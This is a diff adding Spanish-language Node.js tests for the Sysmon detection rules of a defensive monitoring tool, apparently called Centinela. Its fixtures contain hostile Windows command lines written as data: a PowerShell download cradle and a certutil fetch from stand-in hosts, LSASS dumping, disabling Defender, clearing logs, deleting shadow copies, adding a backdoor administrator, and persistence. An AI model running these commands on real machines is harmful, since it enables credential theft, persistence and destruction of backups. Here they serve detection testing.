@@ -290,3 +290,103 @@ test('linea de comandos: --analizar investiga un auth.log viejo con sus horas re
   assert.match(fs.readFileSync(path.join(dir, 'informe.txt'), 'utf8'), /QUE HACER/);
   fs.rmSync(dir, { recursive: true, force: true });
 });
+
+// ---------------- Sysmon ----------------
+const PS = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
+const ISE = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe';
+let registro = 1;
+const proceso = (img, padre, cmd, pid = 5000 + registro) => `2026-11-25T23:12:51Z Log=Sysmon RecordId=${registro++} EventID=1 || User=PC\\ana || ProcessId=${pid} || Image=${img} || ParentImage=${padre} || CommandLine=${cmd}`;
+const reglasDe = (ctx) => ctx.almacen.incidentes.map((i) => i.regla);
+
+test('Sysmon: caso del laboratorio (usuario "soporte" creado desde PowerShell ISE)', async () => {
+  const { ctx } = contexto();
+  ctx.motor.procesarLinea('windows', proceso('C:\\Windows\\System32\\net.exe', ISE, 'net user soporte Clave123! /add'));
+  ctx.motor.procesarLinea('windows', proceso('C:\\Windows\\System32\\net1.exe', 'C:\\Windows\\System32\\net.exe', 'C:\\Windows\\system32\\net1 user soporte Clave123! /add'));
+  ctx.motor.procesarLinea('windows', proceso(ISE, 'C:\\Windows\\explorer.exe', '"powershell_ise.exe" New-LocalUser -Name soporte'));
+  ctx.motor.procesarLinea('windows', proceso('C:\\Windows\\System32\\net.exe', PS, 'net localgroup Administradores soporte /add'));
+  ctx.motor.procesarLinea('windows', proceso('C:\\Windows\\System32\\schtasks.exe', PS, 'schtasks /create /tn Actualizar /tr "powershell -w hidden -f C:\\Users\\Public\\a.ps1" /sc onlogon'));
+  const usuarios = ctx.almacen.incidentes.filter((i) => i.regla === 'sysmon-usuario-por-comando');
+  assert.ok(usuarios.length >= 1);
+  assert.equal(usuarios.reduce((n, i) => n + i.eventos, 0), 4, 'net, net1, New-LocalUser y localgroup');
+  assert.ok(reglasDe(ctx).includes('sysmon-tarea-programada'));
+  assert.equal(ctx.almacen.incidentes.find((i) => i.regla === 'sysmon-tarea-programada').mitre, 'T1053.005');
+});
+
+test('Sysmon: Office que lanza PowerShell y borrado de copias cortan el proceso', async () => {
+  const { ctx } = contexto();
+  ctx.motor.procesarLinea('windows', proceso(PS, 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE', 'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://x/a\')"', 7001));
+  await new Promise((res) => setTimeout(res, 30));
+  const inc = ctx.almacen.incidentes.find((i) => i.regla === 'sysmon-office-lanza-consola');
+  assert.ok(inc);
+  assert.ok(inc.acciones.some((a) => /Proceso 7001 .*terminado/.test(a.texto)));
+  assert.ok(reglasDe(ctx).includes('sysmon-powershell-sospechoso'));
+
+  const espera2 = listo(ctx);
+  ctx.motor.procesarLinea('windows', proceso('C:\\Windows\\System32\\vssadmin.exe', 'C:\\Users\\ana\\AppData\\Local\\Temp\\x.exe', 'vssadmin.exe Delete Shadows /All /Quiet', 7002));
+  const r = await espera2;
+  assert.equal(r.regla, 'sysmon-borrar-copias');
+  assert.ok(r.emergencia);
+  // Otro borrado dentro del mismo incidente tambien se corta
+  ctx.motor.procesarLinea('windows', proceso('C:\\Windows\\System32\\wbem\\WMIC.exe', 'C:\\Users\\ana\\AppData\\Local\\Temp\\x.exe', 'wmic shadowcopy delete', 7003));
+  await new Promise((res) => setTimeout(res, 30));
+  assert.ok(r.acciones.some((a) => /Proceso 7003/.test(a.texto)));
+});
+
+test('Sysmon: robo de credenciales, apagar defensas, borrar registros y binarios de Windows', () => {
+  const { ctx } = contexto();
+  ctx.motor.procesarLinea('windows', `2026-11-25T23:12:51Z Log=Sysmon RecordId=${registro++} EventID=10 || User=PC\\ana || ProcessId=6100 || Image=C:\\Users\\ana\\Downloads\\x.exe || TargetImage=C:\\Windows\\system32\\lsass.exe || GrantedAccess=0x1010`);
+  ctx.motor.procesarLinea('windows', proceso('C:\\Windows\\System32\\rundll32.exe', PS, 'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full'));
+  ctx.motor.procesarLinea('windows', proceso(PS, 'C:\\Windows\\System32\\cmd.exe', 'powershell Set-MpPreference -DisableRealtimeMonitoring $true'));
+  ctx.motor.procesarLinea('windows', proceso('C:\\Windows\\System32\\wevtutil.exe', PS, 'wevtutil cl Security'));
+  ctx.motor.procesarLinea('windows', proceso('C:\\Windows\\System32\\certutil.exe', PS, 'certutil -urlcache -split -f http://198.51.100.9/a.exe C:\\Users\\Public\\a.exe'));
+  ctx.motor.procesarLinea('windows', `2026-11-25T23:12:51Z Log=Sysmon RecordId=${registro++} EventID=13 || User=PC\\ana || ProcessId=6200 || Image=C:\\Users\\Public\\a.exe || TargetObject=HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Actualizador || Details=C:\\Users\\Public\\a.exe`);
+  const r = reglasDe(ctx);
+  for (const id of ['sysmon-robo-credenciales', 'sysmon-apagar-defensas', 'sysmon-borrar-registros', 'sysmon-binario-del-sistema', 'sysmon-arranque-automatico']) assert.ok(r.includes(id), id);
+  assert.equal(ctx.almacen.incidentes.find((i) => i.regla === 'sysmon-robo-credenciales').eventos, 2);
+});
+
+test('Sysmon: reconocimiento solo con 5 comandos distintos seguidos', () => {
+  const { ctx } = contexto();
+  const cmds = [['whoami.exe', 'whoami /all'], ['ipconfig.exe', 'ipconfig /all'], ['net.exe', 'net user'], ['systeminfo.exe', 'systeminfo']];
+  for (const [img, c] of cmds) ctx.motor.procesarLinea('windows', proceso(`C:\\Windows\\System32\\${img}`, 'C:\\Windows\\System32\\cmd.exe', c));
+  ctx.motor.procesarLinea('windows', proceso('C:\\Windows\\System32\\whoami.exe', 'C:\\Windows\\System32\\cmd.exe', 'whoami /all'));
+  assert.ok(!reglasDe(ctx).includes('sysmon-reconocimiento'), 'repetir whoami no suma');
+  ctx.motor.procesarLinea('windows', proceso('C:\\Windows\\System32\\nltest.exe', 'C:\\Windows\\System32\\cmd.exe', 'nltest /dclist:'));
+  assert.ok(reglasDe(ctx).includes('sysmon-reconocimiento'));
+});
+
+test('Sysmon: la actividad normal no genera alertas (ni el propio Centinela)', () => {
+  const { ctx } = contexto();
+  const normales = [
+    proceso('C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Windows\\explorer.exe', '"chrome.exe" --type=renderer'),
+    proceso(PS, 'C:\\Program Files\\nodejs\\node.exe', `powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\\centinela\\lib\\detectores\\leer-eventos.ps1 -Segundos 60`),
+    proceso('C:\\Windows\\System32\\netstat.exe', 'C:\\Program Files\\nodejs\\node.exe', 'netstat -an -p TCP'),
+    proceso('C:\\Windows\\System32\\netsh.exe', 'C:\\Program Files\\nodejs\\node.exe', 'netsh advfirewall firewall add rule name=Centinela-1.2.3.4 dir=in action=block remoteip=1.2.3.4'),
+    proceso('C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', 'C:\\Windows\\explorer.exe', '"WINWORD.EXE" /n "C:\\Users\\ana\\informe.docx"'),
+    proceso('C:\\Windows\\System32\\net.exe', 'C:\\Windows\\System32\\cmd.exe', 'net use Z: \\\\servidor\\compartida'),
+    proceso(PS, 'C:\\Windows\\explorer.exe', 'powershell.exe Get-Process | Sort-Object CPU'),
+    `2026-11-25T23:12:51Z Log=Sysmon RecordId=${registro++} EventID=10 || User=NT AUTHORITY\\SYSTEM || ProcessId=3000 || Image=C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe || TargetImage=C:\\Windows\\system32\\lsass.exe || GrantedAccess=0x1010`,
+  ];
+  for (const l of normales) ctx.motor.procesarLinea('windows', l);
+  assert.deepEqual(reglasDe(ctx), []);
+});
+
+test('respuesta: nunca corta procesos vitales de Windows', async () => {
+  const { ctx } = contexto();
+  assert.match((await ctx.respuesta.terminarProceso(700, 'C:\\Windows\\System32\\lsass.exe')).error, /vital/);
+  assert.equal(await ctx.respuesta.terminarProceso(4, 'System'), null);
+  assert.equal(await ctx.respuesta.terminarProceso(process.pid, 'node.exe'), null);
+  assert.ok((await ctx.respuesta.terminarProceso(9999, 'C:\\Temp\\malo.exe')).ok);
+});
+
+test('linea de comandos: --analizar acepta eventos de Windows/Sysmon guardados', () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sysmon-'));
+  const archivo = path.join(dir, 'eventos.txt');
+  fs.writeFileSync(archivo, `\uFEFF${proceso('C:\\Windows\\System32\\net.exe', ISE, 'net user soporte X1! /add')}\r\n${proceso('C:\\Windows\\System32\\vssadmin.exe', PS, 'vssadmin delete shadows /all')}\r\n`);
+  const salida = execFileSync(process.execPath, [path.join(__dirname, '..', 'centinela.js'), '--analizar', archivo, '--config', path.join(dir, 'c.json')], { encoding: 'utf8' });
+  assert.match(salida, /Tipo: windows/);
+  assert.match(salida, /Usuario creado/);
+  assert.match(salida, /copias de seguridad/);
+  assert.match(salida, /net user soporte/);
+  fs.rmSync(dir, { recursive: true, force: true });
+});
